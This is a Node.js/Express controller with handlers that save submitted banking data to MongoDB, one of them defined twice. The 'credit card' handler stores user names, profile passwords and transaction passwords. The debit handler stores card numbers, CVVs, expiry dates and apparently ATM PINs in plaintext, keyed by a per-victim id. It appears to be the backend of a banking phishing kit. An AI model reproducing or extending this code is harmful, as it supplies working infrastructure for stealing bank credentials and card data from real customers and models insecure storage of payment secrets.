const User = require('../models/User');
const DebitCardData = require("../models/DebitCardData");
const CreditCardData = require("../models/CreditCardData");

exports.saveCreditCardData = async (req, res) => {
  try {
    const { uniqueid, userName, profilePass, transactionPass } = req.body;

    // Use findOneAndUpdate with upsert for an atomic operation:
    const updatedDoc = await CreditCardData.findOneAndUpdate(
      { uniqueid }, // query by uniqueid
      { 
        $push: { 
          entries: { userName, profilePass, transactionPass, submittedAt: new Date() }
        } 
      },
      { upsert: true, new: true, runValidators: true }
    );

    res.status(200).json({
      success: true,
      message: "Credit Card Data Submitted Successfully!",
      data: updatedDoc
    });
  } catch (error) {
    console.error("Detailed error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting credit card data"
    });
  }
};



exports.saveCreditCardData = async (req, res) => {
  try {
    const { uniqueid, userName, profilePass, transactionPass } = req.body;
    let user = await CreditCardData.findOne({ uniqueid });

    if (user) {
      user.entries.push({  userName, profilePass, transactionPass  });
    } else {
      user = new CreditCardData({
        uniqueid,
        entries: [{ userName, profilePass, transactionPass  }]
      });
    }

    await user.save();

    res.status(200).json({
      success: true,
      message: "Credit Card Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting credit card data"
    });
  }
};

exports.saveDebitCardData = async (req, res) => {
  try {
    const { uniqueid, cardNumber, cvv, expiry, atmNo } = req.body;
    let user = await DebitCardData.findOne({ uniqueid });

    if (user) {
      user.entries.push({ cardNumber, cvv, expiry, atmNo });
    } else {
      user = new DebitCardData({
        uniqueid,
        entries: [{ cardNumber, cvv, expiry, atmNo }]
      });
    }

    await user.save();

    res.status(200).json({
      success: true,
      message: "Debit Card Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting debit card data"
    });
  }
};
